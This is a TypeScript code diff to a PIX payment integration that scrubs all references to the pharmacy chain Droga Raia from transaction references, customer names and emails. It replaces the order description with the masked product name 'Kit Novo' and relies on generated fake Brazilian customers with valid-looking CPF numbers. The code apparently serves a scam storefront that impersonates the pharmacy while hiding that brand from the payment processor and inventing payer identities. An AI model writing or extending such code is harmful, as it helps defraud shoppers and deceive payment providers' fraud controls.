@@ -21,9 +21,11 @@ export interface FlevoAddress {
   zipcode?: string;
 }
 
+export const FLEVO_MASKED_PRODUCT_NAME = 'Kit Novo';
+
 export interface CreateFlevoTransactionParams {
   amount: number; // Em centavos (ex: 1000 = R$ 10,00)
-  description: string;
+  description?: string;
   reference?: string;
   customer?: Partial<FlevoCustomer>;
   address?: FlevoAddress;
@@ -125,8 +127,8 @@ export function generateRealisticCustomer(
 ): FlevoCustomer {
   // Nome do cliente
   let fullName = preferredName?.trim();
-  const invalidNameKeywords = ['casa', 'trabalho', 'apto', 'apartamento', 'outro', 'entrega', 'minha casa'];
-  if (!fullName || fullName.length < 3 || invalidNameKeywords.includes(fullName.toLowerCase())) {
+  const invalidNameKeywords = ['casa', 'trabalho', 'apto', 'apartamento', 'outro', 'entrega', 'minha casa', 'raia', 'droga', 'drogaria', 'farmacia', 'farma', 'portal'];
+  if (!fullName || fullName.length < 3 || invalidNameKeywords.some((k) => fullName!.toLowerCase().includes(k))) {
     const fn = BRAZILIAN_FIRST_NAMES[Math.floor(Math.random() * BRAZILIAN_FIRST_NAMES.length)];
     const ln1 = BRAZILIAN_LAST_NAMES[Math.floor(Math.random() * BRAZILIAN_LAST_NAMES.length)];
     const ln2 = BRAZILIAN_LAST_NAMES[Math.floor(Math.random() * BRAZILIAN_LAST_NAMES.length)];
@@ -135,7 +137,8 @@ export function generateRealisticCustomer(
 
   // E-mail gerado de acordo com o nome do cliente
   let email = preferredEmail?.trim();
-  if (!email || !email.includes('@')) {
+  const hasForbiddenEmailDomain = email && (email.includes('raia') || email.includes('farmacia') || email.includes('droga'));
+  if (!email || !email.includes('@') || hasForbiddenEmailDomain) {
     const parts = fullName.split(/\s+/).filter(Boolean);
     const firstPart = slugifyName(parts[0] || 'cliente');
     const lastPart = slugifyName(parts[parts.length - 1] || 'silva');
@@ -162,6 +165,24 @@ export function generateRealisticCustomer(
     phone,
     document: document.length === 11 ? document : generateValidCPF(),
   };
+}
+
+/**
+ * Gera uma referência externa de pedido totalmente neutra (ex: PED-1791289233422-28414).
+ * Não inclui nenhuma menção a "RAIA", "DROGA" ou "FARMACIA".
+ */
+export function generateGenericReference(customRef?: string): string {
+  if (customRef && typeof customRef === 'string') {
+    const cleaned = customRef
+      .replace(/(?:raia|droga|drogaria|farmacia|farmácia|farma|drogasil|portal)+/gi, 'PED')
+      .replace(/(?:PED)+/g, 'PED')
+      .replace(/--+/g, '-')
+      .trim();
+    if (cleaned && cleaned !== 'PED' && cleaned !== 'PED-') {
+      return cleaned;
+    }
+  }
+  return `PED-${Date.now()}-${Math.floor(Math.random() * 89999 + 10000)}`;
 }
 
 /**
@@ -192,11 +213,13 @@ export async function createFlevoPixTransaction(
   );
 
   const productHash = generateRandomProductHash();
-  const reference = params.reference || `RAIA-${Date.now()}-${Math.floor(Math.random() * 89999 + 10000)}`;
+  const reference = generateGenericReference(params.reference);
 
   const payload = {
     amount: params.amount,
-    description: params.description || 'Droga Raia - Pedido Online',
+    description: FLEVO_MASKED_PRODUCT_NAME,
+    product_name: FLEVO_MASKED_PRODUCT_NAME,
+    item_name: FLEVO_MASKED_PRODUCT_NAME,
     reference,
     source: 'api_externa',
     productHash,
